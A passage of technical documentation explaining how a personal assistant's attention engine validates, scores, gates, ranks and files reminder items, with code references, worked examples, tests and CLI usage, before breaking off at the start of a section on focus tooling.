Honest accounting of what `orion-attention-collect` actually executes (`scripts/orion-attention-collect:128-165`): collect -> load queue -> `addToQueue` -> `openItems` -> `rankAttention` -> `buildTodayFeed` -> `attentionDigest` -> save queue + write feed. It does **not** call `dedupAttentionItems`, `noveltyOf`, `canInterrupt`/`recordInterruption`, `explainAttention` or `simulateAttentionDay`. Those are libraries that are tested in isolation (and `simulate.mjs` composes rank+budget). Dedup in the live pass happens a different way: `addToQueue` replaces an open/snoozed entry that has the same `dedupKey` (`store.mjs:56-85`).

Terms used throughout: an **item** is the validated record (`item.mjs`); a **queue entry** is an item plus `state`, `surfaced`, `ackedAt`, `snoozedUntil`; a **signal** is one of six numbers in [0,1] or `null` (unknown); a **route** is `interrupt` (show now), `today` (file for the Today feed) or `drop`.

---

### 5.1 Attention item shape and validation (`item.mjs`)

- **What it is** The schema for one thing that wants Nick's attention, plus a validator and a normalizer. Everything downstream assumes items passed through this contract (although the CLI collect pass does not call `validateAttentionItem` on source output; sources are trusted to emit valid shapes and tests pin that).
- **Where** `scripts/lib/attention/item.mjs`: constants 1-5; `validateAttentionItem` 11-96; `normalizeAttentionItem` 98-134.
- **How it works**
  1. `ATTENTION_SOURCES = ["calendar","waiting","focus","standing","automation","manual"]` (`item.mjs:1`). Only calendar, waiting, focus and manual have source readers; `standing` and `automation` are reserved names.
  2. `ATTENTION_SIGNALS = ["urgency","actionability","novelty","confidence","importance","interruptibility"]` (`:2`).
  3. Validation collects every error rather than stopping at the first, so a test can assert each bad field is named. Rules: `id` must match `/^[a-z0-9][a-z0-9:._-]{1,95}$/` (`:4`); `kind` `/^[a-z_]{1,40}$/`; `title` 1-200 chars after trim; `detail` a string up to 1000 chars; `observedAt` a non-negative safe integer; `dueAt` and `expiresAt` null or non-negative safe integer; `dedupKey` 1-120 chars; `signals` an object with **exactly** the six keys, each `null` or a finite number in [0,1]; any other top-level key is `"<k>: unknown field"` (`:88-93`).
  4. `normalizeAttentionItem` builds a new object (no mutation), trims title/detail, clamps finite signals into [0,1], then re-validates and throws `TypeError("invalid attention item")` if it is still invalid (`:128-131`).
- **Contracts** Item JSON: `{ id, source, kind, title, detail, observedAt, dueAt|null, expiresAt|null, dedupKey, signals:{six keys} }`. All times are epoch milliseconds.
- **Gotchas & lessons** `isSafePositiveInteger` is misnamed: it allows 0 (`>= 0`). `null` is the vocabulary for "I do not know", and the whole engine is built around never turning `null` into 0 (see scoring).
- **Walk it yourself** `sed -n 1,96p scripts/lib/attention/item.mjs`; `node --test tests/attention-item.test.mjs`.
- **Questions to ask your tutor** Why does the validator demand exactly six signal keys instead of "any subset"? What would break in `scoreAttentionItem` if `null` were silently coerced to 0 at normalize time?

---

### 5.2 Urgency from a due time (`urgency.mjs`)

- **What it is** A pure step function turning "how long until due" into a 0..1 urgency. Returns `null` (not 0) when there is no due time.
- **Where** `scripts/lib/attention/urgency.mjs:8-33`.
- **How it works** `hours = (dueAt - now)/3_600_000`, then the table (first match wins):

| hours until due | urgency |
|---|---|
| <= 0 (due or overdue) | 1 |
| <= 1 | 0.95 |
| <= 6 | 0.8 |
| <= 24 | 0.6 |
| <= 72 | 0.4 |
| <= 168 (7 days) | 0.25 |
| > 168 | 0.1 |

  `now` must be a safe integer or it throws `TypeError("invalid time")`; `dueAt` the same unless null (`:10-22`).
- **Gotchas** This function is **not called** by any source reader. The calendar source hard-codes its own urgency (0.95/0.8/0.6 by minutes) and the waiting source hard-codes 0.85/0.6. `urgencyFromDue` exists as a tested general-purpose helper (`tests/attention-urgency.test.mjs`) for future sources. **(inferred)** that it was intended for the `standing`/`automation` sources that were never built.
- **Questions to ask your tutor** Why return `null` rather than 0.1 for "no due date"? What does a step function lose versus a smooth decay, and what does it buy in explainability?

---

### 5.3 Scoring (`score.mjs`)

- **What it is** Collapses the six signals into one 0..1 score, ignoring unknown signals and refusing to score when too little is known.
- **Where** `scripts/lib/attention/score.mjs:1-53`. Weights: lines 1-8.
- **How it works**
  1. Default weights (`score.mjs:1-8`): urgency 0.30, importance 0.20, actionability 0.15, confidence 0.15, novelty 0.10, interruptibility 0.10 (sum 1.00).
  2. A signal is *known* if it is a finite number; otherwise *unknown* (`:25-32`). `known`/`unknown` lists come out in the weight-table order (urgency, importance, actionability, confidence, novelty, interruptibility), not in the item's key order (test "known and unknown are reported in weight order").
  3. **Three-known-signals rule**: fewer than 3 known -> `{score:null, known, unknown}` (`:34-36`). This is the "unranked" state.
  4. Otherwise a **weighted mean over only the known signals**:

```js
// scripts/lib/attention/score.mjs:38-52
const weightSum = known.reduce((sum, k) => sum + weights[k], 0);
if (weightSum === 0) { return { score: null, known, unknown }; }
const weightedSum = known.reduce((sum, k) => sum + weights[k] * signals[k], 0);
const rawScore = weightedSum / weightSum;
const score = Math.round(rawScore * 10000) / 10000;
```

  i.e. `score = Sum(w_k * s_k) / Sum(w_k)` over known k, rounded to 4 decimals. Because the denominator shrinks with the known set, a missing signal neither helps nor hurts: it is excluded, not counted as 0.
- **Worked examples** (using the real source constants)
  - Calendar event starting in 8 min: urgency .95, actionability .7, confidence .9 known (novelty/importance/interruptibility null). Sum w = .30+.15+.15 = .60; Sum w*s = .285+.105+.135 = .525; score = .525/.60 = **0.875**.
  - Calendar event in 25 min: urgency .8 -> (.24+.105+.135)/.6 = **0.80**. In 45 min: urgency .6 -> .42/.6 = **0.70**.
  - Overdue waiting item: urgency .85, actionability .8, confidence .8, interruptibility .5 known (4): Sum w = .70; Sum w*s = .255+.12+.12+.05 = .545; score = **0.7786**.
  - "No focus today" item: urgency .2, actionability .5, confidence .7 -> (.06+.075+.105)/.6 = **0.40**.
  - Bare manual reminder (`orion-attention add "x"`): only actionability .8 and confidence 1 known (2) -> score **null** (unranked).
- **Contracts** Input: an item/entry with `.signals`. Output `{score:number|null, known:string[], unknown:string[]}`. Optional second argument `weights` (custom weights honoured; test pins it).
- **Gotchas & lessons** The 3-known rule is why a manual reminder with no `--urgency`/`--importance` lands in the Today feed as "unranked" and never interrupts. A missing `weights[k]` would make the sum `NaN`; only the default weights are used in production.
- **Walk it yourself** `node --test tests/attention-score.test.mjs`; compute the 8-minute calendar example above by hand and compare with the test fixtures.
- **Questions to ask your tutor** Why a weighted mean over known signals rather than treating unknown as 0.5? What failure does the "at least 3 known" floor prevent? Which signals does each source actually provide?

---

### 5.4 Novelty (`novelty.mjs`)

- **What it is** Turns "how often have we already shown this dedupKey in the last 7 days" into a 0..1 novelty value.
- **Where** `scripts/lib/attention/novelty.mjs:9-50`.
- **How it works** Count history rows with `dedupKey === key` and `surfacedAt` in `[now-7d, now]` (malformed rows skipped: non-object, non-string key, non-integer time). Map: 0 -> **1**, 1 -> **0.6**, 2 -> **0.35**, 3+ -> **0.1**. Non-array history is treated as empty.
- **Gotchas** **Unused in production.** No source sets `novelty` (all emit `novelty: null`), and no code builds the `{dedupKey, surfacedAt}` history. The queue instead keeps a `surfaced` counter that only `fromWaitingStore` reads (to lower `interruptibility`). Tests: `tests/attention-novelty.test.mjs`.
- **Questions to ask your tutor** If novelty were wired in, where would the surfacing history live and who would append to it? Why do repeats decay roughly geometrically?

---

### 5.5 Dedup (`dedup.mjs`)

- **What it is** Collapses items with the same `dedupKey` that were observed within a window, keeping the newest.
- **Where** `scripts/lib/attention/dedup.mjs:13-80`. Default window `6 * 3_600_000` ms (6 hours) (`:18`).
- **How it works** Group by `dedupKey`. In each group sort newest first (`observedAt` DESC, tie -> larger `id` string). The first is the keeper. Every older member whose `newest.observedAt - item.observedAt <= windowMs` is dropped (inclusive); older ones outside the window are kept as separate occurrences. Returns `{kept, dropped:[{id, keptId}]}`; `kept` is sorted `observedAt` DESC then `id` ASC; input is never mutated; non-array input throws `TypeError("items must be an array")`.
- **Gotchas** Not called by the collect CLI; the queue's `addToQueue` does key-based replacement instead. Note the window is relative to the **newest** item, not to now.
- **Questions to ask your tutor** What is the difference between dedup-before-queue and replace-in-queue? Why compare against the newest rather than chain neighbours?

---

### 5.6 Interruption budget (`budget.mjs`)

- **What it is** A rolling-window rate limiter for "interrupt" deliveries, kept as a ledger of timestamps.
- **Where** `scripts/lib/attention/budget.mjs:10-41` (`canInterrupt`), `:48-56` (`recordInterruption`).
- **How it works**
  1. Defaults: `maxPerHour = 2`, `maxPerDay = 8` (`:11-12`).
  2. Only safe-integer ledger entries count. Hour window is `(now-1h, now]`, day window `(now-24h, now]`.
  3. If hour count >= limit -> `{allowed:false, reason:"hour_limit", nextAt: oldestInHour + 1h}`. Else if day count >= limit -> `"day_limit"`, `nextAt: oldestInDay + 24h`. Hour is checked first. Otherwise `{allowed:true, reason:"ok", nextAt:null}`.
  4. `recordInterruption` returns a NEW ledger: entries within the last 24 h plus `now`, sorted ascending (older ones pruned).
- **Gotchas** Used only by `simulate.mjs`. There is no persisted ledger file and nothing in the real pipeline enforces "max 2 interrupts an hour"; real proactive rate-limiting lives elsewhere (e.g. `orion-reach`'s "never repeats, holds overnight").
- **Questions to ask your tutor** Why return `nextAt` instead of just a boolean? Why check hour before day?

---

### 5.7 The gate (`gate.mjs`)

- **What it is** The decision function: given an item and context, route it to `interrupt`, `today` or `drop` with a machine reason.
- **Where** `scripts/lib/attention/gate.mjs:16-48` (`attentionGate`), `:57-66` (`isInQuietHours`).
- **How it works** Rules, first match wins (`gate.mjs:4-10`, code `:17-47`). `urgency = item.signals.urgency ?? 0`, so a null urgency counts as 0, i.e. below every threshold.

| # | Condition | Route (deliver) | Reason |
|---|---|---|---|
| 1 | `expiresAt !== null && expiresAt <= now` | drop (false) | `expired` |
| 2 | `context.score === null` | today (false) | `unranked` |
| 3 | in quiet hours AND urgency < 0.9 | today (false) | `quiet_hours` |
| 4 | `focusActive !== false` AND urgency < 0.9 | today (false) | `focus_active` (if `true`) or `focus_unknown` (if `null`/undefined) |
| 5 | `score >= 0.6` | interrupt (true) | `score` |
| 6 | otherwise | today (false) | `low_score` |

  Quiet hours `[s,e]` (`:57-66`): `null`/wrong length/`s===e` -> never quiet; `s<e` -> `s <= h < e`; `s>e` wraps midnight -> `h >= s || h < e`.
- **Key consequence** Two constants run the policy: **0.9** (the "very urgent" bypass for quiet hours and focus) and **0.6** (the interrupt score threshold). Unknown focus is treated as focus (fail-quiet): `focusActive: null` is "not false", so rule 4 fires.
- **Contracts** Context `{now, hourOfDay, quietHours?:[s,e], focusActive?:true|false|null, score}`. Note `rankAttention` supplies `score`.
- **Gotchas & lessons**
  - In the one real driver (`orion-attention-collect`) `focusActive` is hard-coded `null` (`scripts/orion-attention-collect:152-157`). Combined with rule 4, **only items with urgency >= 0.9 and score >= 0.6 can ever interrupt**. Among the real sources that means just a calendar event starting within 10 minutes (urgency .95). The 25-min event (.8) and the overdue waiting item (.85) both come out `today / focus_unknown`.
  - `hourOfDay` in that CLI defaults to the **UTC** hour (`getUTCHours`, `:76`) and the `--quiet S-E` window is in the same UTC hours, unless you pass `--hour`.
  - The focus source's `focusActiveFrom(focusJson, now)` (see 5.12) exists to supply this value but the CLI does not call it.
- **Walk it yourself** `node --test tests/attention-gate.test.mjs`; read the "quiet hours wrap midnight" test.
- **Questions to ask your tutor** Why does rule 2 (unranked) sit before quiet hours? What would "focus unknown" do to a medical-alarm item with urgency 1? Why is the gate separate from the score?

---

### 5.8 Rank (`rank.mjs`)

- **What it is** Applies score + gate to every queue entry and sorts them into `now` (interrupt), `later` (today feed) and `dropped`.
- **Where** `scripts/lib/attention/rank.mjs:11-73`.
- **How it works** For each entry: `scoreAttentionItem(entry)` -> `attentionGate(entry, {...context, score})`. Interrupt rows go to `now` as `{id,title,source,score,reason,dueAt}`; `today` -> `later` (same shape); `drop` -> `dropped` as `{id, reason}`. Sorting comparator (applied to `now` and `later` only): **score DESC with null last**, then **dueAt ASC with null last**, then **id ASC**. A tutor tip: `now`/`later` are the interrupt/today buckets and map to the feed fields `interrupt`/`today` in `buildTodayFeed`.
- **Contracts** `rankAttention(entries, {now, hourOfDay, quietHours?, focusActive?})` -> `{now[], later[], dropped[]}`.
- **Tests** `tests/attention-rank.test.mjs` (284 lines) pins: high score interrupts and low waits; expired entries dropped with reason; unknown focus files everything not very urgent; ordering score -> due -> id.
- **Questions to ask your tutor** Why are null scores sorted last instead of first? What is the difference between `later` and `dropped`?

---

### 5.9 Explain (`explain.mjs`)

- **What it is** Turns a gate reason and a score into up to three plain sentences.
- **Where** `scripts/lib/attention/explain.mjs:9-50`.
- **How it works** Sentence 1 from a fixed table: `expired` "Dropped: it expired."; `unranked` "Filed for later: too little is known to rank it."; `quiet_hours` "Held for later: it is quiet hours and this is not urgent enough to break them."; `focus_active` "Held for later: you are focusing and this can wait."; `focus_unknown` "Held for later: it is not known whether you are focusing, so it waits."; `score` "Shown now: it scored high enough to interrupt."; `low_score` "Filed for later: worth knowing, not worth interrupting for."; unknown reasons fall back to `Routed to <route>: <reason>.`. Sentence 2: `Only N of 6 signals are known.` (null score) or `Scored <score> from N of 6 signals.`. Sentence 3 (if any unknown): `Unknown: a, b.`.
- **Gotchas** Not called by the CLI; exists so a future "why was I told this?" feature can answer.

---

### 5.10 Digest (`digest.mjs`) and the Today feed (`today-feed.mjs`)

- **What they are** The two output formats: a short plain-text digest (voice/Discord-friendly) and the JSON feed file the apps read.
- **Where** `scripts/lib/attention/digest.mjs:8-52`; `scripts/lib/attention/today-feed.mjs:8` (path), `17-41` (`buildTodayFeed`), `52-61` (`writeTodayFeed`).
- **How `buildTodayFeed` works** `outages` (strings or `{source,message}` objects) are reduced to unique **source names only** so no error text or file path reaches the feed (`today-feed.mjs:18-20`; this came from review commit `a76bd9e`, 2026-09-27: "feed names unreadable sources, never their error text"). Note: with outages -> `Could not read: <sources>. Missing sources are unknown, not quiet.`; with none and both buckets empty -> `Nothing needs you.`; else `null`. Result: `{version:1, generatedAt: ISO string, interrupt: ranked.now, today: ranked.later, outages, note}`.
- **How `writeTodayFeed` works** `mkdir -p` dir mode 0700; write `.attention-today-<uuid>.tmp` in the same dir mode 0600; `rename` into place (atomic, so a reader never sees half a file).
- **How `attentionDigest` works** (`max` default 5): "Now:" section from `feed.interrupt`, "Later today:" from `feed.today`, each `- <title>` lines capped at `max` then `…and N more`. If both empty: no outages -> `Nothing needs you.`, outages -> `Nothing to show, but <note>`. If outages with content, the note is appended as the final line.
- **Contracts** Feed path constant `TODAY_FEED = ~/.openclaw/orion-controlled/attention-today.json`. The Swift LinkCore reads it (`SnapshotReader.swift:18`, test fixture at `native/OrionLink/Tests/LinkCoreTests/LinkCoreTests.swift:77`).
- **Gotchas** "Missing sources are unknown, not quiet" is the project-wide rule: a source that could not be read must never be rendered as "all quiet". The same wording appears in `orion-focus prepare` ("a blind spot, not an empty day", `scripts/orion-focus:185`).
- **Tests** `tests/attention-digest.test.mjs`, `tests/attention-today-feed.test.mjs` (file is written privately; outage is named, never "nothing needs you").

---

### 5.11 Queue store (`store.mjs`)

- **What it is** The durable queue: a JSON file holding open/snoozed/acked entries, with pure functions that return new queues.
- **Where** `scripts/lib/attention/store.mjs`: `emptyQueue` 5-7, `loadAttentionQueue` 13-35, `saveAttentionQueue` 41-49, `addToQueue` 56-85, `ackQueueItem` 90-100, `snoozeQueueItem` 105-115, `pruneQueue` 120-133, `openItems` 139-152.
- **How it works**
  - File shape `{version:1, items:[entry...]}`. Entry = item + `state` (`open|acked|snoozed`), `surfaced` (int), `ackedAt`, `snoozedUntil`.
  - Load: ENOENT -> empty queue; JSON/shape error -> `Error("attention queue unreadable")` (never silently replaced: the collect CLI rethrows so a corrupt queue stops the pass instead of being overwritten, `scripts/orion-attention-collect:138-146`).
  - Save: mkdir 0700, write `<file>.<pid>.<ms>.tmp` mode 0600, `rename`.
  - `addToQueue`: for each item, find an existing entry with the same `dedupKey` whose state is `open` or `snoozed`; if found, replace it with the new item data but **keep `state`, `surfaced`, `snoozedUntil`** and reset `ackedAt` to null; else append as `open, surfaced 0`. An **acked** entry with the same key does not match, so a fresh open entry is appended (the item can resurface after ack).
  - `pruneQueue`: removes entries with `expiresAt <= now`, and acked entries acked more than 7 days ago.
  - `openItems`: not expired AND (`state==="open"` OR (`snoozed` and `snoozedUntil <= now`)).
- **Gotchas** `surfaced` is only ever 0 from `addToQueue`; nothing in the repo increments it, so the waiting source's `surfaced >= maxSurfaced -> interruptibility 0.1` branch cannot fire for real queue data. **(inferred from grep; nothing writes `surfaced`)**.
- **Tests** `tests/attention-store.test.mjs` (238 lines): round-trip + file private, corrupt refused, same-key replacement keeps `surfaced`, ack/snooze/open, prune, unknown ids throw, no mutation.

---

### 5.12 Source readers (`sources/*.mjs`)

All four turn raw data into items. All set `novelty`, `importance`, and (except waiting/manual) `interruptibility` to `null`.

**Calendar** (`sources/calendar.mjs:8-116`) `fromCalendarEvents(events, {now, horizonMinutes=90})`
- Window `[now-5min, now+90min]` (`:16-17`). Non-array input throws; unreadable events (no parseable `start`/`startDate`) are counted as `skipped`; all-day events and events outside the window are silently ignored.
- Key: `event.identifier` if present, else first 12 hex of `sha256("<title>|<startMs>")`, lower-cased, non `[a-z0-9._-]` replaced by `-`. `id = dedupKey = calendar:<key>`.
- Title: `"<title> starts now"` (0 min) or `"<title> starts in N min"`, cut to 200 chars; empty title -> `Untitled event`.
- Urgency by minutes: <=10 -> **0.95**; <=30 -> **0.8**; else **0.6**. Other signals: actionability **0.7**, confidence **0.9**. `kind:"starting_soon"`, `dueAt = start`, `expiresAt = start + 15 min`.

**Waiting** (`sources/waiting.mjs:13-73`) `fromWaitingStore(store, {now, maxSurfaced=3})`
- Store must be `{version:1, items:[]}` else `TypeError("invalid waiting store")`. Keeps entries with `status==="open"`, not snoozed past now, `dueBy` matching `YYYY-MM-DD`, and `dueBy <= today (UTC date)`.
- Overdue: title `Still waiting on <who>: <what>`, kind `overdue`, urgency **0.85**. Due today: `Due today from <who>: <what>`, kind `due_today`, urgency **0.6**. `detail: "Ends when: <expect>"`. `dueAt = dueBy T23:59:59Z`, `expiresAt:null`. actionability **0.8**, confidence **0.8**, interruptibility **0.1** if `entry.surfaced >= 3` else **0.5**. `id = dedupKey = waiting:<entry.id>`.
- Not to be confused with `scripts/orion-waiting` (6.9), which lists unapproved approval tickets and has nothing to do with the waiting-on store.

**Focus** (`sources/focus.mjs`)
- `focusActiveFrom(focusJson, now)` (`:10-35`) mirrors "the automation host's legacy reading" of `focus.json`: `null` file -> `false`; non-object -> `null`; `session === null` -> `false`; `session.until` a positive safe integer -> `now <= until`; otherwise `null` (unknown). This is the function meant to feed `gate.focusActive`; it reads the old `~/.openclaw/orion-controlled/focus.json` shape that `orion-focus` writes (see 6.4), not the Mac app's session file. **Not called by the CLI.**
- `fromFocusHistory(rows, {now})` (`:47-113`) sums `servedFocusSeconds` for rows whose `startedAt` UTC date equals today's UTC date; if the sum is exactly 0 **and** `getUTCHours() >= 15`, it emits one `no_focus_today` item: id/dedupKey `focus:none:<YYYY-MM-DD>`, title "No focus session yet today", urgency **0.2**, actionability **0.5**, confidence **0.7**, `expiresAt = today 23:59:59Z`. (Score 0.40 -> always `today`.)

**Manual** (`sources/manual.mjs:10-115`) `parseManualAttention(argv, {now})`
- Title is the first argument that does not start with `--` (trimmed); empty -> `TypeError("title is required")`. Known flags only: `--due`, `--expires` (parsed with `Date.parse`, must be a date), `--urgency`, `--importance` (finite numbers in [0,1]). Unknown flag -> `unknown flag --x`; missing value -> `--x needs a value`. (`findTitle` returns the first argument not starting with `--`, which includes a flag's *value*: `add --due 2026-10-15 "x"` would take the date as the title. Put the title first.)
- id `manual:<12 hex of sha256("<title>|<now>")>`; dedupKey `manual:<lowercased title, runs of non-alnum -> "-", cut to 100>` so re-adding the same title replaces the open entry. `kind:"reminder"`, actionability **0.8**, confidence **1**.

**Contracts / tests** `tests/attention-src-calendar|waiting|focus|manual.test.mjs`. The focus test also pins the `until === now -> true` boundary.

---

### 5.13 Collect (`collect.mjs`)

- **What it is** Runs whichever readers are supplied, converts to items, and records outages instead of failing.
- **Where** `scripts/lib/attention/collect.mjs:11-57`.
- **How it works** `collectAttention({now, readers})`: for each of `readers.calendar`, `readers.waiting`, `readers.focusHistory` (only if it is a function) `await` it inside `try/catch`; success pushes items; any throw becomes `{source, message: err.message.slice(0,200)}` in `outages`. Final sort: `observedAt` DESC then `id` ASC. An unconfigured reader is simply absent (no outage). An invalid waiting store is an outage (test "an invalid store is an outage").
- **Gotchas** `maxSurfaced`/`horizonMinutes` are not exposed, so defaults (3 and 90) always apply. The outage `message` can contain paths; that is exactly why the feed and digest only ever carry the `source` name.

---

### 5.14 Simulate (`simulate.mjs`)

- **What it is** A what-if harness: run a full UTC day hour by hour through rank + budget.
- **Where** `scripts/lib/attention/simulate.mjs:15-79`.
- **How it works** For `hour 0..23`, `now = Date.parse("<day>T<hh>:00:00Z")`. Rank the not-yet-decided entries with `{now, hourOfDay: hour, quietHours, focusActive: focusByHour(hour)}`. For each `now`-bucket row, in rank order, ask `canInterrupt(ledger, now, budget)`: allowed -> count an interrupt, record it in the ledger, mark decided; refused -> `blockedByBudget++`, `filed++`, mark decided (it is never retried). After hour 23, every undecided entry counts as `filed`. Returns `{interrupts, filed, blockedByBudget, perHour:[{hour, interrupts}]}`.
- **Gotchas** Each entry is "decided" the first hour it ranks as `now`, so an item blocked by the budget at 09:00 is not reconsidered at 10:00. Tests: `tests/attention-simulate.test.mjs`.

---

### 5.15 CLI: `scripts/orion-attention`

- **What it is** The manual front door to the queue: list, show, add, ack, snooze, prune. Node script, no model involvement found (no workspace file mentions it; only `HANDOFF.md:630`).
- **Where** `scripts/orion-attention` (280 lines). Arg parsing 19-56, usage 58-67, commands 69-234, dispatch 236-280.
- **Contracts** Default queue file `~/.openclaw/orion-controlled/attention.json` (`:17`). Global options accepted anywhere: `--json` (boolean), `--file PATH` (use another queue file), `--until ISO` (snooze time). Exit codes: 0 ok, 1 runtime failure (unreadable queue, unknown id), 2 usage error.

| Subcommand | Form | Behaviour |
|---|---|---|
| `list` | `list [--json] [--file PATH]` | Loads queue, `openItems(queue, Date.now())`; empty -> prints `No attention items.` (exit 0). Scores each, sorts score DESC (null last) then id. Text line: `  <score.toFixed(2) or " —  ">  <title>  (<source>)`. `--json` prints rows `{id,title,source,score,state}`. |
| `show <id>` | `show <id> [--file PATH]` | Prints the full stored entry as JSON; no such id -> `no attention item <id>` exit 1; missing id -> exit 2. Looks at **all** entries, not only open ones. |
| `add "title"` | `add "title" [--due ISO] [--expires ISO] [--urgency n] [--importance n] [--file PATH]` | Builds an item via `parseManualAttention` and `addToQueue`; prints `added <id>`. Bad flags -> message + exit 2. (In `main` the `add` word and `--file <v>` are stripped from raw argv and the remainder passed on, `:249-266`.) |
| `ack <id>` | `ack <id>` | State -> `acked`, `ackedAt = now`; prints `acknowledged <id>`; unknown id exit 1. |
| `snooze <id>` | `snooze <id> --until ISO` | State -> `snoozed`, `snoozedUntil = Date.parse(until)`; invalid date exit 2; prints `snoozed <id> until <ISO>`. (If `--until` is omitted `Date.parse(null)` is NaN -> "--until must be a valid date".) |
| `prune` | `prune` | `pruneQueue(queue, now)`; prints `pruned N item(s)`. |

  No command -> usage + exit 2; unknown command -> `unknown command: x` + usage, exit 2. Extra positional args -> `unknown argument: x`, exit 2 (except for `add`, which passes everything through).
- **Side effects** Writes only the queue file (atomic, mode 0600). No notifications, no network.
- **History** `71ec4f3` 2026-09-27 list/show; `d738369` same day removed an unused import; `4d756a0` add/ack/snooze/prune; `2f89313` 2026-10-07 (a mass touch in a schedule fix commit, no behavioural change to this file **(inferred)**).
- **Tests** `tests/attention-cli-read.test.mjs` (list ordering, `--json`, missing queue = empty, show, unknown command refused) and `tests/attention-cli-write.test.mjs` (add then list, ack hides, snooze hides until time, bad input refused, prune count). These run the real script against a temp `--file`.
- **Gotchas** `list` filters by `openItems`, so acked/snoozed/expired items vanish from it but still show with `show <id>`. The `--json` rows omit `reason`; `list` does not run the gate.
- **Walk it yourself** `node scripts/orion-attention list --file /tmp/x.json` is safe (read-only on a missing file prints "No attention items."); `sed -n 19,56p scripts/orion-attention`.
- **Questions to ask your tutor** Why does `show` search all entries while `list` only shows open ones? How does `add` dedupe a repeated title? Why is the queue written with mode 0600 in a 0700 directory?

---

### 5.16 CLI: `scripts/orion-attention-collect`

- **What it is** One collection pass: read fixture files, build items, update the queue, rank, write the Today feed and print the digest.
- **Where** `scripts/orion-attention-collect` (177 lines). Arg parser 15-39, flag handling 41-125, pipeline 127-172.
- **Contracts** Required: `--queue FILE`, `--feed FILE` (missing -> usage on stderr, exit 2). Optional:

| Flag | Meaning |
|---|---|
| `--calendar-json FILE` | JSON array of calendar events (reader for `fromCalendarEvents`) |
| `--waiting-json FILE` | JSON `{version:1, items:[...]}` waiting store |
| `--focus-history FILE` | JSONL focus-history rows; bad lines are skipped |
| `--now ISO` | Fixed clock (`Date.parse`; invalid -> exit 1); default `Date.now()` |
| `--hour N` | Hour of day for the gate (default: **UTC** hour of `now`); NaN -> exit 1 |
| `--quiet S-E` | Quiet hours window, e.g. `22-7` (two numbers; silently ignored if malformed) |
| `--dry-run` | Print digest, write nothing |

  Parser quirk: any `--key` followed by a non-`--` token consumes it as a value, otherwise it is boolean `true` (`:24-33`); unknown flags are accepted silently.
- **How it works** (lines 127-171): collect -> load queue (a corrupt queue throws `attention queue unreadable` and the script exits 1 with the message on stderr, never overwriting) -> `addToQueue` -> `rankAttention(openItems(queue, now), {now, hourOfDay, quietHours, focusActive:null})` -> `buildTodayFeed(ranked, {now, outages: unique sources})` -> print `attentionDigest(feed)` -> unless `--dry-run`, `saveAttentionQueue` then `writeTodayFeed`.
- **Side effects** Writes the queue file and the feed file (both atomic, private). Prints the digest to stdout. Nothing is sent anywhere; delivery of the digest is not implemented here.
- **History** `89f8b55` 2026-09-27 introduced it; `a76bd9e` same day: feed names sources only, never error text, and comments about leftover reasoning removed.
- **Tests** `tests/attention-cli-collect.test.mjs`: a pass writes queue + feed and prints digest; `--dry-run` writes nothing; a missing input file shows up as an outage in the digest; missing required flags refused.
- **Gotchas & lessons** (1) Because `focusActive` is `null`, only urgency >= 0.9 items interrupt (see 5.7). (2) `hourOfDay` is UTC unless overridden. (3) The calendar window is fixed at 90 minutes. (4) A missing `--calendar-json` file is an *outage* (the reader throws), but omitting the flag entirely is simply "no calendar source" and shows nothing for it: a pass with no flags reports "Nothing needs you." even though nothing was read. Treat that line with care.
- **Walk it yourself** Make a temp dir, write an empty array to `cal.json`, run `node scripts/orion-attention-collect --queue /tmp/q.json --feed /tmp/f.json --calendar-json /tmp/cal.json --dry-run` (writes nothing). Read `tests/attention-cli-collect.test.mjs:11-89`.
- **Questions to ask your tutor** Trace a calendar event 8 minutes away from JSON to the digest line. Why is a corrupt queue fatal while a corrupt source is only an outage? What would it take to schedule this on a cron and get real focus state into the gate?

### 5.17 Section 5 history, in one place

All 30-odd `agent(att-*)` commits are 2026-09-27, produced by the "attention-and-ops" project plan (`HANDOFF.md:620-640` describes it: 30 tasks, every written path new, fixtures only). Notable: `1ce6099` calendar source, `0fef874` waiting source, `87c0b32` focus source, `8c27665` manual source, `a62395f` rank, `79661c3` explain, `6f9b155` budget, `94ad4b6` collect, `720d6ac` feed, `ef0e5a6` digest, `51a6642` simulate, `a76bd9e` review fix (feed names sources only). Design doc: `docs/planning/v2/ATTENTION_ENGINE.md` (matches the code on weights, 3-known rule, gate order and quiet-hour semantics; I checked these specifically).

**Tests summary (all under `tests/`)**: `attention-{budget,collect,dedup,digest,explain,gate,item,novelty,rank,score,simulate,store,today-feed,urgency}.test.mjs`, `attention-src-{calendar,focus,manual,waiting}.test.mjs`, `attention-cli-{collect,read,write}.test.mjs`. They pin purity (no input mutation), the "unknown is never zero" rule, outages-not-silence, and private file modes.


---

## 6. Focus, on-task, lock, phone time

### In this section

| Part | Topic |
|---|---|
| 6.1 | Escalation ladder and on-task judgment (`lib/focus/escalation.mjs`) |
| 6.2 | `orion-ontask` |
| 6.3 | `orion-ontask-watch` (supervisor tick) and the phone app-list policy (`phone-lists.mjs`) |
| 6.4 | State module (`lib/focus/state.mjs`) |
| 6.5 | Sequences, day total and `orion-focus-report` |
| 6.6 | `orion-focus` (retired lockdown) |
| 6.7 | `orion-lock` |
| 6.8 | `orion-phone-time` |
| 6.9 | `orion-waiting` |
| 6.10 | Cross-cutting notes |
| 6.11 | State and data files on disk |

**Orientation: three different things share the word "focus".** A tutor (and Nick) can lose a whole afternoon to this, and the repo has too (see commit `6eb4dca`, 2026-10-06).

| Name | What it is | Who owns the state | Status |
|---|---|---|---|
| **Focus session** (what he sees in the Mac app: 3 x 50 blocks, breaks, Live Activity) | A timed work/break sequence | The Mac app's own session file `~/.openclaw/orion-controlled/focus-state.json`, history in `focus-history.jsonl`; ORION starts it through **`scripts/orion-session`** (not in my scope; chapter on session/schedule) | Current. `plugin/workspace/AGENTS.md:249` and `:441-ish` say focus = `orion-session` |
| **Schedule focus / on-task watch** (`orion-ontask`, `orion-ontask-watch`, `lib/focus/*`) | Supervises him *during calendar-planned focus blocks*: is the front app a distraction? Escalates nudge -> say -> front -> quit -> lock. Also decides which phone app lists to shield | `~/.openclaw/orion-controlled/ontask-state.json` | Current, Swift-driven every 30 s |
| **Lockdown** (`orion-focus`) | The original, Phase 60 CLI lockdown: start a session, strike count, a local model judges "plead" requests | `~/.openclaw/orion-controlled/focus.json` | **Retired from ORION's allowlist** (`6eb4dca`, 2026-10-06; `plugin/workspace/AGENTS.md` says "orion-focus, the old lockdown, is retired"), still in the repo, still referenced by `TOOLS.md:64`/`PLAYBOOK.md:84` |
| **`orion-lock`** | Not focus at all: the emergency off switch that drops ORION's own authority | `lock.json`, `permission-state.json` | Current; Phase 43 |
